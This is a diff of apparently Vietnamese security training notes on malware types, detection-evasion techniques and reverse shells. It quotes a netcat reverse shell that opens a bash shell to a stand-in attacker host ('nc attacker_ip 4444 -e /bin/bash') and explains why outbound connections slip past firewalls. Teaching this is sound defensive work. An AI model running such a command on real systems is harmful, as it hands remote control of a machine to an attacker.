@@ -1,37 +1,47 @@
-# 1. Trojan, Backdoor and Reverse Shell
-## 1.1 Trojan (Trojan Horse) là phần mềm độc hại giả dạng phần mềm hợp pháp, lừa người dùng tự chạy.
-Đặc điểm chung:
-- Có chức năng ẩn (hidden functionality).
-- Người dùng tự chạy → dẫn đến lây nhiễm.
-- Không tự nhân bản như virus/worm. (TODO kiểm chứng dựa trên wiki)
+# 1. Chương trình độc hại
+Chương trình độc hại là những chương trình máy tính, có thể viết bằng ngôn ngữ biên dịch hoặc thông dịch, được viết nhằm phục vụ mục đích xấu.
+## Hình thức lây nhiễm
+- Tự lây lan bằng cách nhiễm độc vào một file hợp lệ, hoặc thông qua các thiết bị chia sẻ dữ liệu hoặc thông qua lỗ hổng bảo mật: virus, worm 
+- Sử dụng Social Engineering, giả mạo là một chương trình không độc hại
+- Tấn công vào credential yếu, credential được tái sử dụng, bị lộ lọt.
 
-Ví dụ trong thực tế defensive:
-- File crack giả chứa payload để cài backdoor.
-- Tập tin chứa macro độc hại.
+## Phương pháp qua mặt hệ thống nhận diện
+- Dropper: Là một chương trình tải mã độc về máy.
+- Fileless Malware: Thực thi mã độc trong memory để tránh scan file hoặc file forensics
+- Hacktool: sử dụng các chương trình hợp lệ (ví dụ psexec) để threat actor thao túng hệ thống
+- Packer / Crypter: Sử dụng các phương pháp mã hóa để che giấu đoạn mã độc trong file.
+- Rootkit: Sử dụng kỹ thuật hooking để che giấu sự tồn tại trên hệ thống.
 
-## 1.2 Backdoor
-Backdoor là cơ chế truy cập bí mật vào hệ thống mà không qua cơ chế xác thực thông thường.
-Backdoor có thể:
-- Được attacker cài vào sau khai thác.
-- Được lập trình viên để lại (intentional/unintentional).
-- Tồn tại dưới dạng service, hook, plugin hoặc script.
+## Mục đích tấn công
+- Điều khiển máy tính từ xa: Trojan, Backdoor, Virus, Worm
+- Đánh cắp dữ liệu: Trojan, Spyware, Stealer, Keylogger
+- Chiếm dụng tài nguyên trái phép: CoinMiner, Botnet
+- Cài đặt các URL hoặc application, extension trái phép: Adware, PUP
+- Phá hoại dữ liệu hoặc hệ thống hạ tầng: Destructor
+=> Một phần mềm độc hại có thể bao gồm nhiều chức năng. Vì vậy, việc phân chia theo category chỉ mang tính chất tương đối.
 
-## 1.3. Reverse Shell là gì?
+## Reverse shell
 Reverse Shell là loại backdoor cho phép:
-- Máy nạn nhân tự kết nối ngược về máy attacker.
-- Attacker điều khiển qua kênh lệnh.
-
-Reverse shell thường vượt firewall vì:
-- Outbound traffic thường được cho phép.
-- Hạn chế log bị chú ý hơn bind shell.
+- Máy nạn nhân tự kết nối ngược về máy Threat Actor.
+- Threat actor điều khiển từ xa qua lệnh hệ thống.
 
 Ví dụ: Reverse shell sử dụng netcat
 1. Attacker mở kết nối port 4444: `nc -lvnp 4444`
 2. Client (victim) kết nối đến port 4444: `nc attacker_ip 4444 -e /bin/bash`
 
-Bài tập: bindshell là gì?
+- Reverse shell có thể nằm trong những category nào của malware?
+- Tại sao lại sử dụng Reverse Shell?
+<details>
+<sumary>Một số lý do cơ bản</sumary>
 
-# 2. Socket Programming và HTTP Programming trong Reverse Shell
+- Chương trình có thể cần được cho phép mới có thể mở port. Ví dụ: trên Windows, Windows Firewall sẽ hiện dialog hỏi người dùng có cho phép ứng dụng mở port không.
+- Máy chủ có thể nằm trong một phân vùng mạng nội bộ, được NAT port ra ngoài. Vì vậy, việc mở port bên trong thành công không đồng nghĩa với việc threat actor có thể điều khiển từ xa được.
+- Đối với những giải pháp kiểm soát outbound cơ bản, các giải pháp có thể chỉ hoạt động ở mức độ kiểm soát port outbound. Ví dụ: cho phép kết nối ra internet qua port 53 hoặc 80/443. Threat actor có thể lợi dụng chính sách này để thiết lập kết nối.
+</details>
+
+- Bind shell là gì? So sánh với Reverse Shell?
+
+# 2. Socket Programming và sử dụng với Reverse Shell
 
 ## 2.1. Mô hình Client–Server
 TODO: cần tìm hình minh họa, giải thích chi tiết và rõ ràng hơn (cụ thể OSI stack, vân vân)
